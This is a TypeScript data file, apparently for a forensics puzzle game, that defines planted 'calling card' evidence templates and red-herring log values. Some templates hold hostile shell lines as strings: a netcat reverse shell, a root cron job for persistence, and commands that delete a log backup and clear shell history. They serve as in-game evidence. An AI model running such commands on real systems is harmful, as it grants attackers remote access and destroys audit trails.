import type { Difficulty } from '../types';

// --- Forensics Evidence Pools ---

export type ForensicsLogType = 'ssh' | 'ftp' | 'http';

export const forensicsLogTypes: readonly ForensicsLogType[] = ['ssh', 'ftp', 'http'];

export type ForensicsCallingCardTemplate = {
  readonly path: string;
  readonly content: string;
};

// Calling card templates — {{handle}} is replaced with the attacker's handle
export const forensicsCallingCardTemplates: readonly ForensicsCallingCardTemplate[] = [
  {
    path: '/tmp/.{{handle}}',
    content: '# {{handle}} was here\n# You will never catch me',
  },
  {
    path: '/opt/.backdoor.sh',
    content: '#!/bin/bash\n# {{handle}} — persistent access\nnc -e /bin/bash 0.0.0.0 31337 &',
  },
  {
    path: '/var/tmp/.{{handle}}.log',
    content: '[+] exfil complete — {{handle}}\n[+] credentials dumped\n[+] covering tracks...',
  },
  {
    path: '/etc/cron.d/.{{handle}}',
    content: '# {{handle}} — auto-reconnect\n*/5 * * * * root /tmp/.rev.sh 2>/dev/null',
  },
  {
    path: '/tmp/.session_{{handle}}',
    content: 'SESSION_ID={{handle}}\nTIMESTAMP=2026-03-20T02:45:00Z\nSTATUS=active\nEXFIL=complete',
  },
  {
    path: '/var/log/.cleanup_{{handle}}.sh',
    content: '#!/bin/bash\n# {{handle}} cleanup script\nrm -f /var/log/auth.log.bak\nhistory -c',
  },
];

// Noise IPs for red herring log entries (mix of internal and external)
export const forensicsNoiseIps: readonly string[] = [
  '10.0.0.1',
  '10.0.0.50',
  '192.168.1.100',
  '172.16.0.5',
  '8.8.8.8',
  '203.0.113.42',
  '198.51.100.7',
  '10.10.10.1',
];

// Common usernames for noise log entries
export const forensicsNoiseUsers: readonly string[] = [
  'admin',
  'sysadmin',
  'backup',
  'deploy',
  'monitor',
  'nagios',
  'www-data',
];

// Noise HTTP paths for red herring access.log entries
export const forensicsNoiseHttpPaths: readonly string[] = [
  '/api/health',
  '/api/status',
  '/login',
  '/dashboard',
  '/api/v1/metrics',
  '/favicon.ico',
  '/',
  '/robots.txt',
];

// Number of noise entries per difficulty
export const forensicsNoiseCount: Readonly<Record<Difficulty, readonly [number, number]>> = {
  easy: [1, 2],
  medium: [3, 5],
  hard: [5, 8],
};
